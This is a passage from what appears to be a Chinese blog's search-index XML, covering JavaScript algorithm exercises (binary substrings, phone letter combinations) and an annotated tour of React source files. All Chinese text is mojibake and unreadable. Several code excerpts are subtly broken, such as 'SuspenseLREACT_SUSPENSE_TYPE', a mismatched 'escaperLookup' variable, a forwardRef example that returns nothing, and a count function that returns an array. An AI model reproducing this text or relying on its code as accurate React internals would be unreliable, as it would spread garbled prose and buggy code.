s.match(/[\w']+/g).map(i=&gt;i.split('').reverse().join('')).join(' ')&#125; è®¡æ•°äºŒè¿›åˆ¶å­ä¸² ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œè®¡ç®—å…·æœ‰ç›¸åŒæ•°é‡ 0 å’Œ 1çš„éžç©ºï¼ˆè¿žç»­ï¼‰å­ç¬¦ä¸²çš„æ•°é‡ï¼Œå¹¶ä¸”è¿™äº›å­å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ 0 å’Œ 1 éƒ½æ˜¯ç»„åˆåœ¨ä¸€èµ·çš„ã€‚ é‡å¤å‡ºçŽ°çš„å­ä¸²è¦è®¡ç®—å®ƒä»¬å‡ºçŽ°çš„æ¬¡æ•°ã€‚ ç¤ºä¾‹ï¼š 1234è¾“å…¥ï¼š"00110011"è¾“å‡ºï¼š6è§£é‡Šï¼šæœ‰6ä¸ªå­ä¸²å…·æœ‰ç›¸åŒæ•°é‡çš„è¿žç»­1å’Œ0ï¼š"0011","01","1100","10","0011"å’Œ"01"è¯·æ³¨æ„ï¼Œä¸€äº›é‡å¤å‡ºçŽ°çš„å­ä¸²è¦è®¡ç®—å®ƒä»¬å‡ºçŽ°çš„æ¬¡æ•° 12345678910111213141516171819202122232425262728/** * @param &#123;string&#125; str * @return &#123;number&#125;*/export default (str) =&gt; &#123; // åˆ›å»ºæ•°æ®ç»“æž„å †æ ˆä¿å­˜æ•°æ® const result = [] const match = (str) =&gt; &#123; let j = str.match(/^(0+|1+)/)[0] // j=(nä¸ª)0-&gt;o=(nä¸ª)1;j=(nä¸ª)1-&gt;o=(nä¸ª)0; let o = (j[0] ^ 1).toString().repeat(j.length) let reg = new RegExp(`^($&#123;j&#125;$&#123;o&#125;)`) if (reg.test(str)) &#123; return RegExp.$1 &#125; else &#123; return '' &#125; &#125; // å¾ªçŽ¯ for (let i = 0, len = str.length - 1; i &lt; len; i++) &#123; // ç®€å•é€’å½’ let sub = match(str.slice(i)) if (sub) &#123; result.push(sub) &#125; &#125; return result&#125; æµ‹è¯•ç”¨ä¾‹ï¼š 1234567test('countBinarySubstring(00110011)', () =&gt; &#123; expect(countBinarySubstring('00110011')).toEqual(['0011', '01', '1100', '10', '0011', '01'])&#125;)test('countBinarySubstring(10101)', () =&gt; &#123; expect(countBinarySubstring('10101')).toEqual(['10', '01', '10', '01'])&#125;) çŸ¥è¯†ç‚¹ï¼š å‘çŽ°è§„å¾‹ï¼ŒRegExp æ•°ç»„ç”µè¯å·ç çš„ç»„åˆ ç»™å®šä¸€ä¸ªä»…åŒ…å« 2-9çš„å­—ç¬¦ä¸²ï¼Œè¿”å›žå®ƒèƒ½è¡¨ç¤ºçš„å­—æ¯ç»„åˆã€‚ç»™å‡ºæ•°å­—åˆ°å­—æ¯çš„æ˜ å°„å¦‚ä¸‹ï¼ˆä¸Žç”µè¯æŒ‰é’®ç›¸åŒï¼‰ã€‚æ³¨æ„1ä¸å¯¹åº”ä»»ä½•å­—æ¯ 1231[] 2[abc] 3[def]4[ghi] 5[jkl] 6[mno]7[pqrs] 8[tuv] 9[wxyz] ç¤ºä¾‹ï¼š 12è¾“å…¥ï¼š "23"è¾“å‡ºï¼š ["ad","ae","af","bd","be","bf","cd","ce","cf"] è¯´æ˜Žï¼šä¸Šé¢çš„ç­”æ¡ˆæ˜¯æŒ‰å­—å…¸æŽ’åºçš„ï¼Œå¯ä»¥ä»»æ„é€‰æ‹©ç­”æ¡ˆè¾“å‡ºçš„é¡ºåº 12345678910111213141516171819202122232425262728293031323334353637383940/** * @param &#123;string&#125; digits * @return &#123;string[]&#125;*/export default (digits) =&gt; &#123; if (digits.length &lt; 1) return [] // å»ºç«‹ç”µè¯å·ç é”®ç›˜æ˜ å°„ const map = ['', 1, 'abc', 'def', 'ghi', 'jkl', 'mno', 'pqrs', 'tuv', 'wxyz'] if (digits.length &lt; 2) return map[digits].split('') // å°†è¾“å…¥çš„digits åˆ†éš”æˆæ•°ç»„ï¼Œ234=&gt;[2,3,4] const num = digits.split('') // ä¿å­˜é”®ç›˜æ˜ å°„åŽçš„å­—æ¯å†…å®¹ï¼Œå¦‚ 23=&gt;['abc','def'] const code = [] num.forEach(item =&gt; &#123; code.push(map[item]) &#125;) const comb = (arr) =&gt; &#123; // ä¸´æ—¶å˜é‡ç”¨æ¥ä¿å­˜ä¸¤ä¸ªç»„åˆçš„ç»“æžœ const temp = [] // å¾ªçŽ¯ for (let i = 0, ilen = arr[0].length; i &lt; ilen; i++) &#123; for (let j = 0, jlen = arr[1].length; j &lt; jlen; j++) &#123; temp.push(`$&#123;arr[0][i]&#125;$&#123;arr[1][j]&#125;`) &#125; &#125; // åŽ»æŽ‰ä¸€å¼€å§‹éåŽ†çš„å‰ä¸¤ä¸ªï¼Œæ›¿æ¢ä¸ºè¿™ä¸¤ä¸ªå¾ªçŽ¯åŽçš„ç»“æžœ arr.splice(0, 2, temp) // å½“æ•°ç»„çš„é•¿åº¦å¤§äºŽ1æ—¶é€’å½’ if (arr.length &gt; 1) &#123; comb(arr) &#125; else &#123; return temp &#125; // è¿”å›žçœŸæ­£çš„ç»“æžœ return arr[0] &#125; // å¼€å§‹é€’å½’è¿ç®— return comb(code)&#125; æµ‹è¯•ç”¨ä¾‹ï¼š 1234567891011121314151617test('letterCombinations(23)', () =&gt; &#123; expect(letterCombinations('23')).toEqual(['ad', 'ae', 'af', 'bd', 'be', 'bf', 'cd', 'ce', 'cf'])&#125;)test('letterCombinations(234)', () =&gt; &#123; expect(letterCombinations('234')).toEqual([ 'adg', 'adh', 'adi', 'aeg', 'aeh', 'aei', 'afg', 'afh', 'afi', 'bdg', 'bdh', 'bdi', 'beg', 'beh', 'bei', 'bfg', 'bfh', 'bfi', 'cdg', 'cdh', 'cdi', 'ceg', 'ceh', 'cei', 'cfg', 'cfh', 'cfi' ])&#125;) çŸ¥è¯†ç‚¹ï¼š å…¬å¼è¿ç®— å¡ç‰Œåˆ†ç»„ ç»™å®šä¸€å‰¯ç‰Œï¼Œæ¯å¼ ç‰Œä¸Šéƒ½å†™ç€ä¸€ä¸ªæ•´æ•°ã€‚ æ­¤æ—¶ï¼Œéœ€è¦é€‰å®šä¸€ä¸ªæ•°å­— xï¼Œä½¿å¾—å¯ä»¥å°†æ•´éƒ¨ç‰ŒæŒ‰ä¸‹è¿°è§„åˆ™åˆ†æˆ 1 ç»„æˆ–è€…æ›´å¤šï¼š æ¯ç»„éƒ½æœ‰ x å¼ ç‰Œ ç»„å†…æ‰€æœ‰çš„ç‰Œä¸Šéƒ½å†™ç€ç›¸åŒçš„æ•´æ•° ä»…å½“å¯é€‰çš„ x&gt;=2æ—¶è¿”å›ž true ç¤ºä¾‹ï¼š 123è¾“å…¥ï¼š[1,2,3,4,4,3,2,1]è¾“å‡ºï¼štrueè§£é‡Šï¼šå¯è¡Œçš„åˆ†ç»„æ˜¯ [1,1],[2,2],[3,3],[4,4] æç¤ºï¼š 1 &lt;= deck.length &lt;= 10000 0 &lt;= deck[i] &lt; 10000 çŸ¥è¯†ç‚¹ï¼š å½’å¹¶è¿ç®— ç§èŠ±é—®é¢˜ çŸ¥è¯†ç‚¹ï¼š ç­›é€‰è¿ç®— æ ¼é›·ç¼–ç  çŸ¥è¯†ç‚¹ï¼š äºŒè¿›åˆ¶è¿ç®—]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reactæºç æµ…æž]]></title>
    <url>%2F2019-06-29-React%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[çŸ¥å…¶ç„¶çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œæ¡†æž¶å·¥çš„è‡ªæˆ‘å°è¯•è¿›é˜¶ Reactæºç æµ…æžçŸ¥è¯†ç‚¹ï¼š React Api createElementã€createContextã€JSX=&gt;JSã€ConcurrentModeã€Refã€Componentã€Suspenseã€Hooks React ä¸­çš„æ›´æ–°åˆ›å»º ReactDOM.renderã€Fiberã€UpdateQueueã€FiberRootã€Updateã€expirationTime Fiber Scheduler scheduleWorkã€batchedUpdatesã€performWorkã€performUnitOfWorkã€requestWorkã€react schedulerã€renderRoot å¼€å§‹æ›´æ–° beginWorkä»¥åŠä¼˜åŒ–ã€å„ç±»ç»„ä»¶çš„æ›´æ–°è¿‡ç¨‹ã€è°ƒèŠ‚å­èŠ‚ç‚¹çš„è¿‡ç¨‹ å®Œæˆå„ä¸ªèŠ‚ç‚¹çš„æ›´æ–° completeUnitOfWorkã€è™šæ‹ŸDOMå¯¹æ¯”ã€completeWorkã€é”™è¯¯æ•èŽ·å¤„ç†ã€unwindworkã€å®Œæˆæ•´æ£µæ ‘æ›´æ–° æäº¤æ›´æ–° commitRootæ•´ä½“æµç¨‹ã€å¼€å‘æ—¶çš„å¸®åŠ©æ–¹æ³•ã€æäº¤å¿«ç…§ã€æäº¤DOMæ’å…¥ã€æäº¤DOMæ›´æ–°ã€æäº¤DOMåˆ é™¤ã€æäº¤æ‰€æœ‰ç”Ÿå‘½å‘¨æœŸ å„åŠŸèƒ½çš„å®žçŽ°åŠŸèƒ½ contextçš„å®žçŽ°è¿‡ç¨‹ã€refçš„å®žçŽ°è¿‡ç¨‹ã€hydrateçš„å®žçŽ°è¿‡ç¨‹ã€Reactçš„äº‹ä»¶ä½“ç³» Suspense æ›´æ–°ä¼˜å…ˆçº§çš„æ¦‚å¿µã€æ›´æ–°æŒ‚èµ·çš„æ¦‚å¿µã€Suspenseç»„ä»¶æ›´æ–°ã€timeoutå¤„ç†ã€retryé‡æ–°å°è¯•æ¸²æŸ“ã€lazyç»„ä»¶æ›´æ–° Hooks æ ¸å¿ƒåŽŸç†ã€useStateã€useEffectã€useContentã€å…¶ä»–Hooks API React Api ç›¸å…³React.js123456789101112131415161718192021222324252627282930313233const React = &#123; Children:&#123; map, forEach, count, toArray, only &#125;, createRef, Component, PureComponent, createContext, forWardRef, lazy, memo, Fragment:REACT_FRAGMENT_TYPE, StrictMode:REACT_STRICT_MODE_TYPE, SuspenseLREACT_SUSPENSE_TYPE, createElement:__DEV__?createElementWithValidation:createElement, cloneElement:__DEV__?cloneElementWithValidation:cloneElement, isValidElement:isValidElement, version:ReactVersion, __SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED:ReactSharedInternals,&#125;if (enableStableConcurrentModeAPIs) &#123; React.ConcurrentMode = REACT_CONCURRENT_MODE_TYPE; React.Profiler = REACT_PROFILER_TYPE;&#125; else &#123; React.unstable_ConcurrentMode = REACT_CONCURRENT_MODE_TYPE; React.unstable_Profiler = REACT_PROFILER_TYPE;&#125;export default React; ReactElement.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361// hasOwnProperty æ–¹æ³•è¿”å›žä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæŒ‡ç¤ºå¯¹è±¡è‡ªèº«å±žæ€§ä¸­æ˜¯å¦å…·æœ‰æŒ‡å®šçš„å±žæ€§ï¼ˆä¹Ÿå°±æ˜¯çŸ¥å¦æœ‰æŒ‡å®šçš„é”®ï¼‰const hasOwnProperty = Object.prototype.hasOwnProperty;// å†…å»ºçš„propsconst RESERVED_PROPS = &#123; key: true, ref: true, __self: true, __source: true,&#125;;let specialPropKeyWarningShown, specialPropRefWarningShown;// åˆ¤æ–­æ˜¯å¦æ˜¯åˆæ³•çš„ reffunction hasValidRef(config) &#123; if (__DEV__) &#123; if (hasOwnProperty.call(config, &apos;ref&apos;)) &#123; /** * getOwnPropertyDescriptor è¿”å›žæŒ‡å®šå¯¹è±¡ä¸Šè‡ªæœ‰å±žæ€§æè¿°ç¬¦ï¼ˆè‡ªæœ‰å±žæ€§æŒ‡çš„æ˜¯ç›´æŽ¥èµ‹äºˆè¯¥å¯¹è±¡çš„å±žæ€§ï¼Œä¸éœ€è¦ä»ŽåŽŸåž‹é“¾ä¸Šè¿›è¡ŒæŸ¥æ‰¾çš„å±žæ€§ï¼‰ * get æ–¹æ³•ã€‚èŽ·å–è¯¥å±žæ€§çš„è®¿é—®å™¨å‡½æ•°ï¼ˆgetterï¼‰ã€‚å¦‚æžœæ²¡æœ‰è®¿é—®å™¨ï¼Œè¯¥å€¼ä¸º undefined */ const getter = Object.getOwnPropertyDescriptor(config, &apos;ref&apos;).get; if (getter &amp;&amp; getter.isReactWarning) &#123; return false; &#125; &#125; &#125; return config.ref !== undefined;&#125;// åˆ¤æ–­æ˜¯å¦æ˜¯åˆæ³•çš„ keyfunction hasValidKey(config) &#123; if (__DEV__) &#123; if (hasOwnProperty.call(config, &apos;key&apos;)) &#123; const getter = Object.getOwnPropertyDescriptor(config, &apos;key&apos;).get; if (getter &amp;&amp; getter.isReactWarning) &#123; return false; &#125; &#125; &#125; return config.key !== undefined;&#125;// å®šä¹‰äº† key ä¸åˆæ³•æŠ›å‡ºçš„è­¦å‘Šfunction defineKeyPropWarningGetter(props, displayName) &#123; const warnAboutAccessingKey = function() &#123; if (!specialPropKeyWarningShown) &#123; specialPropKeyWarningShown = true; warningWithoutStack( false, &apos;%s: `key` is not a prop. Trying to access it will result &apos; + &apos;in `undefined` being returned. If you need to access the same &apos; + &apos;value within the child component, you should pass it as a different &apos; + &apos;prop. (https://fb.me/react-special-props)&apos;, displayName, ); &#125; &#125;; warnAboutAccessingKey.isReactWarning = true; Object.defineProperty(props, &apos;key&apos;, &#123; get: warnAboutAccessingKey, configurable: true, &#125;);&#125;// å®šä¹‰äº† ref ä¸åˆæ³•æŠ›å‡ºçš„è­¦å‘Šfunction defineRefPropWarningGetter(props, displayName) &#123; const warnAboutAccessingRef = function() &#123; if (!specialPropRefWarningShown) &#123; specialPropRefWarningShown = true; warningWithoutStack( false, &apos;%s: `ref` is not a prop. Trying to access it will result &apos; + &apos;in `undefined` being returned. If you need to access the same &apos; + &apos;value within the child component, you should pass it as a different &apos; + &apos;prop. (https://fb.me/react-special-props)&apos;, displayName, ); &#125; &#125;; warnAboutAccessingRef.isReactWarning = true; Object.defineProperty(props, &apos;ref&apos;, &#123; get: warnAboutAccessingRef, configurable: true, &#125;);&#125;/** * Factory method to create a new React element. This no longer adheres to * the class pattern, so do not use new to call it. Also, no instanceof check * will work. Instead test $$typeof field against Symbol.for(&apos;react.element&apos;) to check * if something is a React Element. * * @param &#123;*&#125; type * @param &#123;*&#125; key * @param &#123;string|object&#125; ref * @param &#123;*&#125; self A *temporary* helper to detect places where `this` is * different from the `owner` when React.createElement is called, so that we * can warn. We want to get rid of owner and replace string `ref`s with arrow * functions, and as long as `this` and owner are the same, there will be no * change in behavior. * @param &#123;*&#125; source An annotation object (added by a transpiler or otherwise) * indicating filename, line number, and/or other information. * @param &#123;*&#125; owner * @param &#123;*&#125; props * @internal */const ReactElement = function(type, key, ref, self, source, owner, props) &#123; const element = &#123; // This tag allows us to uniquely identify this as a React Element $$typeof: REACT_ELEMENT_TYPE, // Built-in properties that belong on the element type: type, key: key, ref: ref, props: props, // Record the component responsible for creating this element. _owner: owner, &#125;; // å¼€å‘çŽ¯å¢ƒçš„ä¸€äº›å†…å®¹ if (__DEV__) &#123; // The validation flag is currently mutative. We put it on // an external backing store so that we can freeze the whole object. // This can be replaced with a WeakMap once they are implemented in // commonly used development environments. element._store = &#123;&#125;; // To make comparing ReactElements easier for testing purposes, we make // the validation flag non-enumerable (where possible, which should // include every environment we run tests in), so the test framework // ignores it. Object.defineProperty(element._store, &apos;validated&apos;, &#123; configurable: false, enumerable: false, writable: true, value: false, &#125;); // self and source are DEV only properties. Object.defineProperty(element, &apos;_self&apos;, &#123; configurable: false, enumerable: false, writable: false, value: self, &#125;); // Two elements created in two different places should be considered // equal for testing purposes and therefore we hide it from enumeration. Object.defineProperty(element, &apos;_source&apos;, &#123; configurable: false, enumerable: false, writable: false, value: source, &#125;); if (Object.freeze) &#123; Object.freeze(element.props); Object.freeze(element); &#125; &#125; return element;&#125;;/** * åˆ›å»ºå¹¶è¿”å›žç»™å®šç±»åž‹çš„æ–°ReactElementã€‚ * See https://reactjs.org/docs/react-api.html#createelement */export function createElement(type, config, children) &#123; let propName; // Reserved names are extracted const props = &#123;&#125;; let key = null; let ref = null; let self = null; let source = null; if (config != null) &#123; if (hasValidRef(config)) &#123; ref = config.ref; &#125; if (hasValidKey(config)) &#123; key = &apos;&apos; + config.key; &#125; self = config.__self === undefined ? null : config.__self; source = config.__source === undefined ? null : config.__source; // å¦‚æžœä¸æ˜¯å†…å»ºçš„propsä»¥åŠæœ¬èº«æ‹¥æœ‰çš„å±žæ€§ï¼Œå°†å‰©ä½™çš„å±žæ€§ä¼ å…¥åˆ°æ–°çš„propså¯¹è±¡ä¸­ for (propName in config) &#123; if ( hasOwnProperty.call(config, propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName) ) &#123; props[propName] = config[propName]; &#125; &#125; &#125; // å­å¯¹è±¡å¯ä»¥æ˜¯å¤šä¸ªå‚æ•°ï¼Œå¹¶ä¸”è¿™äº›å‚æ•°ä¼šä¼ è¾“åˆ°æ–°åˆ†é…çš„propså¯¹è±¡ä¸Šã€‚ const childrenLength = arguments.length - 2; if (childrenLength === 1) &#123; props.children = children; &#125; else if (childrenLength &gt; 1) &#123; const childArray = Array(childrenLength); for (let i = 0; i &lt; childrenLength; i++) &#123; childArray[i] = arguments[i + 2]; &#125; if (__DEV__) &#123; if (Object.freeze) &#123; Object.freeze(childArray); &#125; &#125; props.children = childArray; &#125; // è§£æžé»˜è®¤å±žæ€§ if (type &amp;&amp; type.defaultProps) &#123; const defaultProps = type.defaultProps; for (propName in defaultProps) &#123; if (props[propName] === undefined) &#123; props[propName] = defaultProps[propName]; &#125; &#125; &#125; if (__DEV__) &#123; if (key || ref) &#123; const displayName = typeof type === &apos;function&apos; ? type.displayName || type.name || &apos;Unknown&apos; : type; if (key) &#123; defineKeyPropWarningGetter(props, displayName); &#125; if (ref) &#123; defineRefPropWarningGetter(props, displayName); &#125; &#125; &#125; return ReactElement( type, key, ref, self, source, ReactCurrentOwner.current, props, );&#125;/** * è¿”å›žä¸€ä¸ªç”Ÿæˆç»™å®šç±»åž‹çš„ReactElementsçš„å‡½æ•°ã€‚ï¼ˆå·²åºŸå¼ƒï¼‰ * See https://reactjs.org/docs/react-api.html#createfactory */export function createFactory(type) &#123; const factory = createElement.bind(null, type); // Expose the type on the factory and the prototype so that it can be // easily accessed on elements. E.g. `&lt;Foo /&gt;.type === Foo`. // This should not be named `constructor` since this may not be the function // that created the element, and it may not even be a constructor. // Legacy hook: remove it factory.type = type; return factory;&#125;export function cloneAndReplaceKey(oldElement, newKey) &#123; const newElement = ReactElement( oldElement.type, newKey, oldElement.ref, oldElement._self, oldElement._source, oldElement._owner, oldElement.props, ); return newElement;&#125;/** * ä»¥ element å…ƒç´ ä¸ºæ ·æ¿å…‹éš†å¹¶è¿”å›žæ–°çš„ React å…ƒç´  * See https://reactjs.org/docs/react-api.html#cloneelement */export function cloneElement(element, config, children) &#123; invariant( !(element === null || element === undefined), &apos;React.cloneElement(...): The argument must be a React element, but you passed %s.&apos;, element, ); let propName; // å¤åˆ¶åŽŸæ¥çš„props const props = Object.assign(&#123;&#125;, element.props); // æå–å†…å»ºpropsç›¸å…³çš„å€¼ let key = element.key; let ref = element.ref; // Self is preserved since the owner is preserved. const self = element._self; // Source is preserved since cloneElement is unlikely to be targeted by a transpiler, and the original source is probably a better indicator of the true owner. const source = element._source; // Owner will be preserved, unless ref is overridden let owner = element._owner; if (config != null) &#123; if (hasValidRef(config)) &#123; // Silently steal the ref from the parent. ref = config.ref; owner = ReactCurrentOwner.current; &#125; if (hasValidKey(config)) &#123; key = &apos;&apos; + config.key; &#125; // Remaining properties override existing props let defaultProps; if (element.type &amp;&amp; element.type.defaultProps) &#123; defaultProps = element.type.defaultProps; &#125; for (propName in config) &#123; if ( hasOwnProperty.call(config, propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName) ) &#123; if (config[propName] === undefined &amp;&amp; defaultProps !== undefined) &#123; // Resolve default props props[propName] = defaultProps[propName]; &#125; else &#123; props[propName] = config[propName]; &#125; &#125; &#125; &#125; // Children can be more than one argument, and those are transferred onto // the newly allocated props object. const childrenLength = arguments.length - 2; if (childrenLength === 1) &#123; props.children = children; &#125; else if (childrenLength &gt; 1) &#123; const childArray = Array(childrenLength); for (let i = 0; i &lt; childrenLength; i++) &#123; childArray[i] = arguments[i + 2]; &#125; props.children = childArray; &#125; return ReactElement(element.type, key, ref, self, source, owner, props);&#125;/** * éªŒè¯å¯¹è±¡æ˜¯å¦ä¸ºReactElementã€‚ * See https://reactjs.org/docs/react-api.html#isvalidelement * @param &#123;?object&#125; object * @return &#123;boolean&#125; True if `object` is a ReactElement. * @final */export function isValidElement(object) &#123; return ( typeof object === &apos;object&apos; &amp;&amp; object !== null &amp;&amp; object.$$typeof === REACT_ELEMENT_TYPE );&#125; ReactElement é€šè¿‡ createElement åˆ›å»ºçš„ï¼Œä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼š typeï¼ˆæŒ‡ä»£ ReactElementçš„ç±»åž‹ï¼‰ å­—ç¬¦ä¸²ã€‚&#39;div&#39;ç­‰ï¼Œè¢«ç§°ä¸º HostComponent Classã€‚ç»§æ‰¿è‡ª Componentæˆ–è€… PureComponentçš„ç»„ä»¶ï¼Œç§°ä¸º ClassComponent æ–¹æ³•ã€‚functinal Component åŽŸç”Ÿã€‚Fragmentã€AsyncModelã€Symbol config children ReactElementåªæ˜¯ä¸€ä¸ªç”¨æ¥æ‰¿è½½ä¿¡æ¯çš„å®¹å™¨ï¼Œé‡Œé¢æœ‰å‡ ä¸ªä¿¡æ¯ï¼š typeï¼Œç”¨æ¥åˆ¤æ–­å¦‚ä½•åˆ›å»ºèŠ‚ç‚¹ keyå’Œ refè¿™äº›ç‰¹æ®Šä¿¡æ¯ propsæ–°çš„å±žæ€§å†…å®¹ $$typeç”¨äºŽç¡®å®šæ˜¯å¦å±žäºŽ ReactElement ReactBaseClasses.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import ReactNoopUpdateQueue from &apos;./ReactNoopUpdateQueue&apos;;/** * Base class helpers for the updating state of a component. */const emptyObject = &#123;&#125;;function Component(props, context, updater) &#123; this.props = props; this.context = context; // If a component has string refs, we will assign a different object later. this.refs = emptyObject; // We initialize the default updater but the real one gets injected by the renderer. this.updater = updater || ReactNoopUpdateQueue;&#125;Component.prototype.isReactComponent = &#123;&#125;;// æ ¸å¿ƒæ–¹æ³•Component.prototype.setState = function(partialState, callback) &#123; invariant( typeof partialState === &apos;object&apos; || typeof partialState === &apos;function&apos; || partialState == null, &apos;setState(...): takes an object of state variables to update or a &apos; + &apos;function which returns an object of state variables.&apos;, ); // DOM å®žçŽ°çš„ this.updater.enqueueSetState(this, partialState, callback, &apos;setState&apos;);&#125;;// å¼ºåˆ¶æ›´æ–°Component.prototype.forceUpdate = function(callback) &#123; this.updater.enqueueForceUpdate(this, callback, &apos;forceUpdate&apos;);&#125;;function ComponentDummy() &#123;&#125;ComponentDummy.prototype = Component.prototype;function PureComponent(props, context, updater) &#123; this.props = props; this.context = context; // If a component has string refs, we will assign a different object later. this.refs = emptyObject; this.updater = updater || ReactNoopUpdateQueue;&#125;const pureComponentPrototype = (PureComponent.prototype = new ComponentDummy());pureComponentPrototype.constructor = PureComponent;// Avoid an extra prototype jump for these methods.Object.assign(pureComponentPrototype, Component.prototype);// isPureComponent å±žæ€§ä¾¿äºŽ REACT-DOM åŽé¢è¾¨è®¤æ˜¯å¦æ˜¯çº¯ç»„ä»¶pureComponentPrototype.isPureReactComponent = true;export &#123;Component, PureComponent&#125;; ReactCreateRef.js123456export function createRef()&#123; const refObject = &#123; current:null, &#125; return refObject;&#125; Refs æä¾›äº†ä¸€ç§æ–¹å¼ï¼Œå…è®¸æˆ‘ä»¬è®¿é—® DOM èŠ‚ç‚¹æˆ–è€…åœ¨ render æ–¹æ³•ä¸­åˆ›å»ºçš„ React å…ƒç´ ã€‚ ä½¿ç”¨ Refs çš„æƒ…å†µï¼š ç®¡ç†ç„¦ç‚¹ï¼Œæ–‡æœ¬é€‰æ‹©æˆ–è€…åª’ä½“æ’­æ”¾ è§¦å‘å¼ºåˆ¶åŠ¨ç”» é›†æˆç¬¬ä¸‰æ–¹ DOM åº“ ä½¿ç”¨ Refs çš„æ–¹æ³•ï¼š string ref function createRef ä¾‹å­ï¼š 12345678910111213141516171819202122232425export default class RefDemo extends React.Component &#123; constructor() &#123; super(); this.objRef = React.createRef(); // &#123;current:null&#125; &#125; componentDidMount() &#123; setTimeout(() =&gt; &#123; this.refs.stringRef.textContent = &apos;string ref got&apos; this.methodRef.textContent = &apos;method ref got&apos; this.objRef.current.textContent = &apos;obj ref got&apos; &#125;, 1000) &#125; render() &#123; return ( &lt;&gt; &lt;p ref=&quot;stringRef&quot;&gt;span1&lt;/p&gt; &lt;p ref=&#123;ele =&gt; (this.methodRef = ele)&#125;&gt;span3&lt;/p&gt; &lt;p ref=&#123;this.objRef&#125;&gt;span3&lt;/p&gt; &lt;/&gt; ) &#125;&#125; forwardRef.js123456export default function forwardRef(render:(props,ref))&#123; return&#123; $$typeof:REACT_FORWARD_REF_TYPE, render, &#125;&#125; React.forwardRef ä¼šåˆ›å»ºä¸€ä¸ª React ç»„ä»¶ï¼Œè¿™ä¸ªç»„ä»¶èƒ½å¤Ÿå°†å…¶æŽ¥å—çš„ ref å±žæ€§è½¬å‘åˆ°å…¶ç»„ä»¶æ ‘ä¸‹çš„å¦ä¸€ä¸ªç»„ä»¶ä¸­ã€‚ ä¸»è¦ä½¿ç”¨çš„æ˜¯ï¼š è½¬å‘ refs åˆ° DOM ç»„ä»¶ åœ¨é«˜é˜¶ç»„ä»¶ä¸­è½¬å‘ refs React.forwardRef æŽ¥å—æ¸²æŸ“å‡½æ•°ä½œä¸ºå‚æ•°ã€‚React å°†ä½¿ç”¨ props å’Œ refs ä½œä¸ºå‚æ•°æ¥è°ƒç”¨æ­¤å‡½æ•°ã€‚æ­¤å‡½æ•°åº”è¯¥è¿”å›ž React èŠ‚ç‚¹ã€‚ 1234567891011121314151617// PureComponentconst TargetComponent = React.forwardRef((props,ref)=&gt;&#123; &lt;input type=&quot;text&quot; ref=&#123;ref&#125; /&gt;&#125;) export default class Comp extends React.Component&#123; constructor()&#123; super(); this.ref = React.createRef(); &#125; componentDidMount()&#123; this.ref.current.value = &apos;ref get input&apos;; &#125; render()&#123; return &lt;TargetComponent ref=&#123;this.ref&#125;/&gt; &#125;&#125; ReactContext.js 123456789101112131415161718192021222324export function createContext(defaultValue,calculateChangedBits)&#123; if(calculateChangedBits === undefined)&#123; calculateChangedBits = null; &#125; const context = &#123; $$typeof:REACT_CONTEXT_TYPE, _calculateChangedBits:calculateChangedBits, _currentValue:defaultValue, _currentValue2:defaultValue, Provider:null, Consumer:null &#125; context.Provider = &#123; $$typeof:REACT_PROVIDER_TYPE, _context:context &#125; if(__DEV__)&#123; ... &#125;else&#123; context.Consumer = context; &#125; return context;&#125; ReactLazy.js12345678910export function lazy(ctor:()=&gt;Thenable&lt;T,R&gt;)&#123; return&#123; $$typeof:REACT_LAZY_TYPE, // ç±» promise _ctor:ctor, _status:-1, // åŠ è½½å®Œè¿”å›žçš„ç»“æžœ _result:null &#125;&#125; Hooksç®€å•ç”¨æ³•ï¼š 1234567891011121314151617import React, &#123; useState,useEffect &#125; from 'react';export default ()=&gt;&#123; const [name,setName] = useState('lbh'); useEffect(()=&gt;&#123; console.log('component update') // è§£é™¤ç»‘å®š return ()=&gt;&#123; console.log('unbind') &#125; &#125;,[]) return( &lt;&gt; &lt;p&gt;My name is:&#123;name&#125;&lt;/p&gt; &lt;input type="text" value=&#123;name&#125; onChange=&#123;e=&gt;setName(e.target.value)&#125;&gt; &lt;/&gt; )&#125; ReactChildren.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249const SEPARATOP = &apos;.&apos;;const SUBSEPARATOR = &apos;:&apos;;function escape(key)&#123; const escapeRegex = /[=:]/g; const escaperLookup = &#123; &apos;=&apos;:&apos;=0&apos;, &apos;:&apos;:&apos;=2&apos; &#125; const escapedString = (&apos;&apos;+key).replace(escapeRegex,function(match)&#123; return escapeLookup[match]; &#125;) return &apos;$&apos; + escapedString;&#125;let didWarnAboutMaps = false;const userProviderKeyEscapeRegex = /\/+/g;function escapeUserProvidedKey(text)&#123; return (&apos;&apos;+text).replace(userProviderKeyEscapeRegex,&apos;$&amp;/&apos;);&#125;// å¯¹è±¡æ± const POOL_SIZE = 10;const traverseContextPool = [];function 